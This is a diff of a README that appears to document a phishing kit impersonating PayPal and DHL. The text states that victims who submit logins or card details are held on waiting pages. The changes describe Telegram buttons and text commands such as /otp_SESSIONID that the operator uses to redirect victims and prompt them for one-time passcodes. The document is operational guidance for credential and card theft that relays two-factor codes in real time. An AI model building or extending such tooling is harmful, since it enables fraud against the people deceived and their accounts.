@@ -7,9 +7,18 @@ When a client submits credentials (PayPal login OR DHL card), they are **immedia
 - PayPal → `/paypal/waiting`
 - DHL → `/dhl/waiting`
 
-### 2. **Telegram Bot Commands**
-You can now control client redirects **directly from Telegram**! No need to use the admin panel.
-Works for **both PayPal and DHL** flows.
+### 2. **Interactive Button Controls** 🆕
+You now have **clickable buttons** directly in Telegram notifications!
+- No typing commands
+- Just click buttons
+- Works for **both PayPal and DHL** flows
+- See `TELEGRAM_BUTTON_GUIDE.md` for complete button documentation
+
+### 3. **Legacy Text Commands**
+Text commands still work if you prefer typing:
+- `/otp_SESSIONID` for PayPal OTP
+- `/dhl_otp_SESSIONID` for DHL OTP
+- And more...
 
 ---
 
